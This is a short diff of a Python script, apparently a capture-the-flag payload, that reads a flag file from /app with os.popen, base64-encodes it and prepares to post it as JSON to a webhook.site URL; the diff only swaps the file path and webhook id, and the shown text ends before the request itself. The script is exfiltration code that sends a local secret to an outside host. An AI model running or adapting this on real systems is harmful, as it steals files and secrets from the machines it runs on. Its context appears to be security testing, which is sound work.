@@ -2,9 +2,9 @@ import urllib.request
 import os
 import json
 
-flag = os.popen('cat /app/flag/flag_8f0f7025cd4c56d2cf6848baa7807a0602a31eab6503d35bc5276b530e55a4c5.txt | base64').read().strip()
+flag = os.popen('cat /app/flags/flag_7255280b-939d-4d5c-aa7e-af319b8721dc.txt | base64').read().strip()
 
-url = 'https://webhook.site/a289d165-13c8-45d3-bda3-e3d876d11034'
+url = 'https://webhook.site/4942a284-d09e-417c-9039-d335aaf9af4b'
 
 data = json.dumps({'flag': flag}).encode('utf-8')
 
